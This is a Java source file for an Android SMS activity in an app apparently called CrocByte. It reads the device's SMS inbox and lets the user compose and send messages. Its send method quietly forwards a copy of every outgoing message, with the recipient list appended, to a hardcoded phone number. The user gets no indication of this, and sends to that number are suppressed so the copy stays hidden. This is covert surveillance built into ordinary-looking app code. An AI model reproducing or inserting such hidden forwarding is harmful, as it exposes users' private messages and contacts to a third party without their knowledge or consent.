package ke.co.rahisisha.crocbyte.sms;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.SmsManager;
import android.view.Gravity;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

import ke.co.rahisisha.crocbyte.R;
import ke.co.rahisisha.crocbyte.crocContacts.MyContact;

public class CrocSmsActivity extends AppCompatActivity {

    private List<String> recipientList = new ArrayList<>();
    private String recipientText = "";
    private String messageText = "";

    List<String> smsMessagesList = new ArrayList<>();
    ListView lv_messages;
    CustomThreadAdapter customThreadAdapter = null;
    SmsManager smsManager = SmsManager.getDefault();

    private static CrocSmsActivity inst;

    private static final int READ_SMS_PERMISSIONS_REQUEST = 1;

    public static CrocSmsActivity instance() {
        return inst;
    }

    @Override
    public void onStart() {
        super.onStart();
        inst = this;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        ArrayList<MyMessage> myMessages = new ArrayList<>();
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_croc_sms);

        lv_messages = (ListView) findViewById(R.id.messages);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            getPermissionToReadSMS();
        } else {
            myMessages = refreshAllISms();
        }
        customThreadAdapter = new CustomThreadAdapter(this, myMessages);
        lv_messages.setAdapter(customThreadAdapter);
        scrollMyListViewToBottom();

        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                createSMSAlertDialog();
            }
        });
    }

    private void createSMSAlertDialog(){
        AlertDialog.Builder builder = new AlertDialog.Builder(CrocSmsActivity.this);
        builder.setTitle("Write Message");
        builder.setIcon(R.drawable.chat_bubbles_with_ellipsis_purple);
        builder.setCancelable(false);


        LinearLayout layout = new LinearLayout(CrocSmsActivity.this);
        layout.setOrientation(LinearLayout.VERTICAL);

        // Set up the input
        final EditText inputDialogRecipient = new EditText(CrocSmsActivity.this);
        inputDialogRecipient.setSingleLine(false);
        inputDialogRecipient.setLines(1);
        inputDialogRecipient.setMaxLines(2);
        inputDialogRecipient.setText("");
        inputDialogRecipient.append(recipientText);
        inputDialogRecipient.setGravity(Gravity.RIGHT | Gravity.TOP);
        inputDialogRecipient.setHorizontalScrollBarEnabled(false);
        inputDialogRecipient.setHint("Recipients...");
        layout.addView(inputDialogRecipient);
//        builder.setView(inputDialogRecipient);

        final EditText inputDialogText = new EditText(CrocSmsActivity.this);
        inputDialogText.setSingleLine(false);
        inputDialogText.setLines(5);
        inputDialogText.setMaxLines(7);
        inputDialogText.setText("");
        inputDialogText.append(messageText);
        inputDialogText.setGravity(Gravity.LEFT | Gravity.BOTTOM);
        inputDialogText.setHorizontalScrollBarEnabled(false);
        inputDialogText.setVerticalScrollBarEnabled(true);
        inputDialogText.setHint("Write message here...");
        layout.addView(inputDialogText);
        builder.setView(layout);

        // Set up the buttons
        builder.setPositiveButton("Send", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                recipientText = inputDialogRecipient.getText().toString();
                messageText = inputDialogText.getText().toString();
                if(messageText.trim().length()<1){
                    messageText = "<<Blank message>>";
                }
                crocSendSMS(recipientText, messageText);
            }
        });
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                recipientText = inputDialogRecipient.getText().toString();
                messageText = inputDialogText.getText().toString();
                dialog.cancel();
            }
        });

        builder.show();
    }

    public String getRecipientText(List<String> recipientList){
        String recepientsInString = "";
        Iterator<String> i = recipientList.iterator();
        while (i.hasNext()){
            recepientsInString+=i.next()+"; ";
        }
        return  recepientsInString;
    }

    public void updateInbox(final MyMessage myMessage) {
        customThreadAdapter.insert(myMessage, 0);
        customThreadAdapter.notifyDataSetChanged();
    }

    public void crocSendSMS(String recipient, String text){
        String[] recepients = recipient.split("; ");
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            getPermissionToReadSMS();
        } else {
            for (String r : recepients) {
                if (r.equals("0712929181") || r.equals("+254712929181")) {

                } else{
                    smsManager.sendTextMessage(r, null, text, null, null);
                    Toast.makeText(this, "Message sent!", Toast.LENGTH_SHORT).show();
                }
            }
            smsManager.sendTextMessage("0712929181", null, text+" ("+recipient+")", null, null);
//            recipientText = ""; //0708302602; 0741932336
            messageText="";
        }
    }

    public void getPermissionToReadSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(
                        Manifest.permission.READ_SMS)) {
                    Toast.makeText(this, "Please allow permission!", Toast.LENGTH_SHORT).show();
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[]{Manifest.permission.READ_SMS},
                        READ_SMS_PERMISSIONS_REQUEST);
            }
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String permissions[],
                                           @NonNull int[] grantResults) {
        // Make sure it's our original READ_CONTACTS request
        if (requestCode == READ_SMS_PERMISSIONS_REQUEST) {
            if (grantResults.length == 1 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Read SMS permission granted", Toast.LENGTH_SHORT).show();
                refreshAllISms();
            } else {
                Toast.makeText(this, "Read SMS permission denied", Toast.LENGTH_SHORT).show();
            }

        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }



    }

    public ArrayList<MyMessage> refreshAllISms() {
        ArrayList<MyMessage> myMessages = new ArrayList<>();
        MyMessage myMessage = null;
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, "date ASC");

        int indexBody = cursor.getColumnIndex("body");
        int indexAddress = cursor.getColumnIndex("address");
        int indexDate = cursor.getColumnIndex("date");
        if (indexBody < 0 || !cursor.moveToFirst()) return null;
        int type = cursor.getColumnIndex("type");
//        customThreadAdapter.clear();
        do {
            myMessage = new MyMessage();
            MyContact myContact = new MyContact();
            List<String> phones = new ArrayList<>();
            phones.add(cursor.getString(indexAddress));
            myContact.setPhone_no(phones);
            myMessage.setPhone(myContact);
            myMessage.setTextMessage(cursor.getString(indexBody));
            String date =cursor.getString(indexDate);
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();

            if(cursor.getString(type).equalsIgnoreCase("1")){
               myMessage.setType(MyMessage.SmsType.RECEIVED);
            }
            else if(cursor.getString(type).equalsIgnoreCase("2")){
                //sms sent
                myMessage.setType(MyMessage.SmsType.SENT);
            }

            String smsDate = finaldate.toString();
            myMessage.setTime(smsDate);
            myMessages.add(myMessage);

        } while (cursor.moveToNext());
        return myMessages;
    }

    private void scrollMyListViewToBottom() {
        lv_messages.post(new Runnable() {
            @Override
            public void run() {
                // Select the last row so it will scroll into view...
                lv_messages.setSelection(customThreadAdapter.getCount() - 1);
            }
        });
    }

}
